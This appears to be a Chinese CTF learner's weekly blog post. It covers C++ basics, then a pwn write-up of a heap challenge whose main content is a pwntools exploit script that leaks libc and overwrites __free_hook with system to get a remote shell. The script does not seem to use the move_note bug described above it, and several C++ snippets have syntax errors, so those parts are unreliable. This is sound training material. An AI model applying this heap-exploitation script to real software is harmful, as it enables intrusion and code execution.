
# week4

## 彩蛋

![img](https://bbs.kanxue.com/upload/attach/202204/943085_957BDMUA32UE7HY.jpg)

双重否定表肯定的文学大师ida

## 所学到的知识

### （1）std::是什么

曾经用c++搞oi的时候，遇到过一些鬼火代码：

```cpp
#include<cstdio>
int main()
{
    std::cout<<"Hello World!"<<std::endl;
    return 0;
}
```

当时就在想：

不过现在转pwn了，会遇到不少c艹的题，而且以后搞Windows和浏览器都有用所以就学了一下：

`std::`是个名称空间标示符，C++标准库中的函数或者对象都是在命名空间`std`中定义的，所以我们要使用标准函数库中的函数或对象都要使用`std`来限定。

这样做的原因：

是因为像`cout`这样的对象在实际操作中或许会有好几个，比如说你自己也可能会不小心定义了一个对象叫`cout`，那么这两个`cout`对象就会产生冲突。

为啥俺之前没写过捏，因为只需要这样：

```cpp
#include<iostream>
或
#include<cstdio>
.
.
.
using namespace std;
```

这些已经刻进DNA的写法过了快4年俺才知道背后的原因，所以说要知其所以然

### （2）类定义`class`：

c++常被称为面向对象编程，就是因为它的一个核心功能——类，通过类可以封装一些标准库之外的功能比如自定义的函数和重载运算符。有点像python的module（貌似只有`public`才类似，`privite`和`protect`不太一样），大致用法如下：

```cpp
class typical_ctf_score
{
public:
    double pwn_score;
    double web_score;
    double misc_score;
    double crypto_score;
    double re_score;
    double get(void)
    void set(double a,double b,double c,double d,double e)
}

double typical_ctf_score::get()
{
    return pwn_score+web_score+misc_score+crypto_score+re_score;
}

void typical_ctf_score::set(double a,double b,double c,double d,double e)
{
    pwn_score=a;
    web_score=b;
    misc_score=c;
    crypto_score=d;
    re_score=e;
}
```

### （3）重载运算符

这个[网站](https://bbs.kanxue.com/elink@344K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2J5N6h3&6G2L8$3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0M7r3I4#2M7%4m8D9N6i4y4Q4x3V1k6U0M7s2m8Q4x3X3c8G2N6X3g2J5L8r3!0S2k6r3W2F1k6#2)9J5k6h3S2@1L8h3H3`.)写的很详细，就不赘述了，给上面的代码加个重载加法的功能：

```cpp
class typical_ctf_score
{
    typedef typical_ctf_score tcs
public:
    double pwn_score;
    double web_score;
    double misc_score;
    double crypto_score;
    double re_score;
    double get(void)
    void set(double a,double b,double c,double d,double e)
    tcs operator+(const tcs& b)
    {
        tcs t;
        t.pwn_score=this->pwn_score+b.pwn_score;
        t.web_score=this->web_score+b.web_score;
        t.misc_score=this->misc_score+b.misc_score;
        t.crypto_score=this->crypto_score+b.crypto_score;
        t.re_score=this->re_score+b.re_score;
        return t
    }
}

double typical_ctf_score::get()
{
    return pwn_score+web_score+misc_score+crypto_score+re_score;
}

void typical_ctf_score::set(double a,double b,double c,double d,double e)
{
    pwn_score=a;
    web_score=b;
    misc_score=c;
    crypto_score=d;
    re_score=e;
}
```

### （4）STL的一个容器——`vector`

`vector`在中文里是向量的意思，它也符合向量从起点向一个方向无限延长的性质

相较于数组需要规定大小，`vector`可以在`push_back`或者`resize`的时候，当超过容器容量上限的时，内部自动分配新的内存和内存空间并同时释放原空间，这样可以十分合理地处理未知输入量的问题

释放和分配好像用的是STL的`allocator`，源码没怎么仔细看。`size()`、`end()`、`begin()`、`capability()`的实现主要依赖三个迭代器（指针），随便搜搜就能搜到，蓝勾不想写

谈谈做题的经验，对于下面这个`vector`：

```cpp
#include<vector>
#include<iostream>
using namespace std;
vector<int> notes;
```

`gdb`里通过符号表访问`notes`指向的空间，存的是三个迭代器的值，再访问`notes`即可看查容器里存的值

### （5）读c++反汇编的技巧

主要的难点在`operator`，回顾前面写的重载加法，有一个发现，如果将`operator`换成`+`号前面一个变量，“（参数）”换成第二个变量就完全说得通了。同样，把`operator`换成第一个变量（通常是后面的括号里从左到右的第一个参数），那么再代入就很好理解了。

## 题解

### 1.`vector`

#### 保护

![img](https://bbs.kanxue.com/upload/attach/202204/943085_KWS9UWFB9Y2TB8W.jpg)

习惯了

#### ida

主要看看`move_note`，其它都和原来的堆题差不大多，`delete`保证了不能使用uaf

![img](https://bbs.kanxue.com/upload/attach/202204/943085_ZXEKX82AU4CWJZV.jpg)

![img](https://bbs.kanxue.com/upload/attach/202204/943085_76Y6J3M5KKM5MCT.jpg)

核心部分大概自己写的话是这个样子的：

```cpp
void move_note()
{
    for(auto i=notes.begin();i<=notes.end();i++)
    {
        puts(*i);
        printf("is this one your want to move? [1/0]");
        choice=get_init();
        if(choice)
        {
            puts("which index you want move to?");
            index=get_init();
            if(index<=0) //防止直接用整数型溢出修改got表或者plt表
            {
                puts("no way");
                exit(-1);
            }
            else
            {
                if(index>=notes.size())
                {
                    notes.resize(index+1,nullptr);
                }
                if(notes[index]!=ptr)
                {
                    notes[index]=*i;
                    *i=nullptr;
                }
            }
            return ;
        }
    }
}
```

漏洞是在`notes.resize()`和下面的指针修改

`notes.resize()`会造成`vector`扩容,并把原来的数据复制到一个新的内存地址,但是`*i`还是原来的内存上的堆块地址,那么我们就可以故意选择一个比较大的`index`,引起扩容,从而使得新的内存地址上有两个相同的堆块.

```python
from pwn import *
from LibcSearcher import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import time
##import base64
context.log_level='debug'
##context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
##context.os = 'linux'
def proof_of_work(sh):
    sh.recvuntil(" == ")
    cipher = sh.recvline().strip().decode("utf8")
    proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed')
    sh.sendlineafter("input your ????>", proof)

r=remote('chuj.top',52913)
proof_of_work(r)
##r=process('./note')
elf=ELF('./note')
libc=ELF('./libc.so.6')

def cho(num):
    r.sendafter('>> ',str(num))

def add(index,size,con):
    cho(1)
    r.sendafter('>> ',str(index))
    r.sendafter('>> ',str(size))
    r.sendafter('>> ',con)

def show(index):
    cho(2)
    r.sendafter('>> ',str(index))

def delet(index):
    cho(3)
    r.sendafter('>> ',str(index))

def edit(index,con):
    cho(4)
    r.sendafter('>> ',str(index))
    time.sleep(5)
    r.send(con)

for i in range(0,8):
    add(i,0xf0,'a')
add(8,0xf8,'b')
add(9,0xf0,'c')
add(10,0xf0,'d')

for i in range(0,11):
    delet(i) ## 0~6 tcache 7~10 unsorted bin
for i in range(0,7):
    add(i,0xf0,'a')

add(7,0xf0,'a')
##gdb.attach(r)
add(8,0xf8,'b')
##gdb.attach(r)
add(9,0xf0,'c')
add(10,0xf0,'/bin/sh\x00')
for i in range(0,7):
    delet(i)
##gdb.attach(r)
delet(7)
payload=0xf0*'a'
payload+=p64(0x100+0x100)
##gdb.attach(r)
edit(8,payload)
##gdb.attach(r)
delet(9)
for i in range(0,7):
    add(i,0xf0,'a')
add(9,0xf0,'a')
##gdb.attach(r)
show(8)
libcbase=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ca0a9-(libc.sym['__libc_start_main']+231)
log.success('libcbase:'+hex(libcbase))
free_hook=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']

add(0,0xf0,'a')
delet(0)
##gdb.attach(r)
edit(8,p64(free_hook))
add(0,0xf0,'a')
add(0,0xf0,p64(system))
delet(10)

r.interactive()
```
